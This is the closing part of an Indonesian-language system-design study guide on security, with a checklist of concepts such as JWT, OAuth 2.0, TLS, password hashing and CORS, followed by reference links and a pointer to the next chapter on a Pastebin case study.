- [ ] Bisa jelaskan perbedaan authentication vs authorization
- [ ] Paham session-based vs JWT authentication
- [ ] Paham OAuth 2.0 flow dan OpenID Connect
- [ ] Paham RBAC, ABAC, dan PBAC
- [ ] Bisa jelaskan symmetric vs asymmetric encryption
- [ ] Paham TLS/SSL handshake dan certificate chain
- [ ] Paham hashing dan kenapa bcrypt/Argon2 untuk password
- [ ] Bisa konfigurasi security headers
- [ ] Paham rate limiting strategies
- [ ] Paham CORS dan konfigurasi yang aman
- [ ] Paham input validation best practices
- [ ] Paham network security (firewall, VPC, security groups)
- [ ] Paham secrets management best practices
- [ ] Bisa melakukan security audit dasar

---

## 🔗 REFERENSI

- **Repo Asli:** [donnemartin/system-design-primer — Security](https://github.com/donnemartin/system-design-primer#security)
- **OWASP Top 10:** [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/)
- **OWASP Cheat Sheets:** [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/)
- **JWT:** [jwt.io](https://jwt.io/)
- **OAuth 2.0:** [oauth.net/2](https://oauth.net/2/)
- **OpenID Connect:** [openid.net/connect](https://openid.net/connect/)
- **Helmet.js:** [helmetjs.github.io](https://helmetjs.github.io/)
- **Let's Encrypt:** [letsencrypt.org](https://letsencrypt.org/)
- **HashiCorp Vault:** [vaultproject.io](https://www.vaultproject.io/)
- **UU PDP Indonesia:** [UU No. 27 Tahun 2022](https://peraturan.bpk.go.id/)

---

> **Lanjut ke:** [`18-studi-kasus-pastebin.md`](./18-studi-kasus-pastebin.md)